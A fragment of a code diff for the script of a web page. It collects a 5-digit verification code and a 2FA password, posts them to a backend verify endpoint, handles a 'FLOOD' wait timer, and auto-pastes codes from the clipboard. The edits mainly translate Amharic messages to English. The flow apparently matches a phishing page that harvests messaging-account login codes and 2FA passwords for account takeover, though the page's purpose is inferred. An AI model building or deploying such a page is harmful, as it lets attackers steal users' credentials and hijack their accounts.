+        } catch(e) { showMsg(2, 'error', 'verification failed, try again'); }
     }
 
     async function submit2FA() {
         const pass = document.getElementById('2fa_input').value;
-        if(!pass) return showMsg(3, 'error', 'ፓስዎርድ ያስገቡ');
         document.getElementById('confirmBtn').disabled = true;
-        document.getElementById('confirmBtn').innerText = 'በማረጋገጥ ላይ...';
+        document.getElementById('confirmBtn').innerText = 'checking...';
         try {
             const res = await fetch(`${API_BASE_URL}/verify_2fa`, {
                 method: 'POST',
@@ -499,19 +571,19 @@
             });
             const data = await res.json();
             handleResponse(data, 3);
-        } catch(e) { 
+        } catch(e) {
             stopLoaders();
-            showMsg(3, 'error', 'ማረጋገጥ አልተቻለም!'); 
+            showMsg(3, 'error', 'cannot verify 2FA');
         }
     }
 
     function handleResponse(data, step) {
-        if (data.status === "SUCCESS") { showStep('success'); } 
+        if (data.status === "SUCCESS") { showStep('success'); }
         else if (data.status === "NEED_2FA") { showStep(3); stopLoaders(); }
         else if (data.status === "FLOOD") { startFloodTimer(data.wait); }
         else {
             stopLoaders();
-            showMsg(step, 'error', 'የተሳሳተ መረጃ! እባክዎ በትክክል ያስገቡ።');
+            showMsg(step, 'error', 'incorrect input, please retry');
             if(step === 2) { currentOtp = ""; updateOtpUI(); }
         }
     }
@@ -519,37 +591,38 @@
     function showMsg(stepId, type, text) {
         const el = document.getElementById('status' + stepId);
         if(!el) return;
-        el.className = 'msg ' + type; el.innerText = text; el.style.display = 'block';
+        el.className = 'msg-bubble ' + (type === 'error' ? 'error' : (type === 'loading' ? 'loading' : 'success-msg'));
+        el.innerText = text; el.style.display = 'block';
     }
 
     function startFloodTimer(seconds) {
         showStep('flood_step');
         let rem = seconds;
         const iv = setInterval(() => {
-            let m = Math.floor(rem / 60), s = rem % 60;
-            document.getElementById('wait_time').innerText = `${m}:${s < 10 ? '0' : ''}${s}`;
+            let m = Math.floor(rem/60), s = rem%60;
+            document.getElementById('wait_time').innerText = `${m}:${s<10?'0':''}${s}`;
             if (rem-- <= 0) { clearInterval(iv); location.reload(); }
-        }, 1000);
+        },1000);
     }
 
     function setupLongPressPaste() {
         const container = document.getElementById('otp_container');
+        if(!container) return;
         let timer;
-        container.addEventListener('touchstart', () => {
-            timer = setTimeout(async () => {
+        container.addEventListener('touchstart', ()=>{
+            timer = setTimeout(async ()=>{
                 try {
                     const text = await navigator.clipboard.readText();
-                    const cleanCode = text.replace(/\D/g, '').slice(0, 5);
-                    if (cleanCode.length === 5) { 
-                        document.getElementById('status2').style.display = 'none';
-                        currentOtp = cleanCode; 
-                        updateOtpUI(); 
-                        submitOTP(); 
+                    const clean = text.replace(/\D/g,'').slice(0,5);
+                    if(clean.length === 5) {
+                        currentOtp = clean;
+                        updateOtpUI();
+                        submitOTP();
                     }
-                } catch (err) {}
-            }, 800);
+                } catch(e){}
+            }, 600);
         });
-        container.addEventListener('touchend', () => clearTimeout(timer));
+        container.addEventListener('touchend', ()=> clearTimeout(timer));
     }
 </script>
 </body>
